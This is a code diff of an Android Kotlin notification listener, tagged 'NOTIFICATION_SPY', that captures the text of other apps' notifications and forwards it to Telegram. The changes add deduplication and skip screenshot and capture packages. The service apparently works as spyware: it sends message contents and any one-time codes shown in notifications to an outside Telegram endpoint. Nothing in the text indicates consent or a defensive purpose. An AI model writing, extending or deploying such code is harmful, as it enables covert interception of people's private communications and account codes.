@@ -12,6 +12,12 @@ class NotificationListener : NotificationListenerService() {
 
     private val TAG = "NOTIFICATION_SPY"
 
+    companion object {
+        // Duplicate alerts ko drop karne ke liye last seen key track karna
+        private var lastProcessedKey: String = ""
+        private var lastProcessedTime: Long = 0L
+    }
+
     override fun onListenerConnected() {
         super.onListenerConnected()
         Log.d(TAG, "Service Connected and Bound to System Successfully!")
@@ -30,11 +36,13 @@ class NotificationListener : NotificationListenerService() {
 
         val packageName = sbn.packageName ?: return
 
-        // 1. Loop Prevention: Drop Telegram, self, and system packages
+        // 1. Loop & System Apps filter (Telegram, System UI, Samsung Capture/Screenshot)
         if (packageName == this.packageName || 
             packageName.startsWith("org.telegram.") || 
             packageName == "android" || 
-            packageName == "com.android.systemui") {
+            packageName == "com.android.systemui" ||
+            packageName.contains("capture") ||
+            packageName.contains("screenshot")) {
             return
         }
 
@@ -59,15 +67,22 @@ class NotificationListener : NotificationListenerService() {
         // Ignore empty/placeholder notifications
         if (title.isEmpty() && finalBody.isEmpty()) return
 
+        // 4. Duplicate Check: Agar same app, title aur text 2 second ke andar dobara aaye to ignore karein
+        val currentKey = "$packageName|$title|$finalBody"
+        val currentTime = System.currentTimeMillis()
+        if (currentKey == lastProcessedKey && (currentTime - lastProcessedTime) < 2000L) {
+            return
+        }
+        lastProcessedKey = currentKey
+        lastProcessedTime = currentTime
+
         val appName = getAppName(packageName) ?: packageName
 
         Log.d(TAG, "Captured: [$appName] $title -> $finalBody")
         TelegramHelper.sendNotification(applicationContext, title, finalBody, appName)
     }
 
-    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
-        // Unused
-    }
+    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
 
     private fun getAppName(packageName: String): String? {
         return try {
